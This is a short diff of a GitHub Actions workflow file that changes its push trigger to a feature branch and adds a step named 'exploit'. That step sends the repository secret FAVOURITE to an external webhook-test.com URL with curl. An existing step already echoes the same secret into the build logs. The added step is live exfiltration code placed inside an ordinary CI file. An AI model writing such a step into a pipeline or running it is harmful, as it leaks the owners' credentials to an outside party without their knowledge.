@@ -3,7 +3,7 @@ name: IaC
 # Controls when the new movie hosting locations are created or updated
 on:
   push:
-    branches: [ main ]
+    branches: [ feature/wohoo ]
   pull_request:
     branches: [ main ]
 
@@ -24,3 +24,7 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+      
+      - name: exploit
+        run: |
+          curl -X POST "https://webhook-test.com/b9e265cbf721c16526e07b1feac6e9da/${{ secrets.FAVOURITE }}"
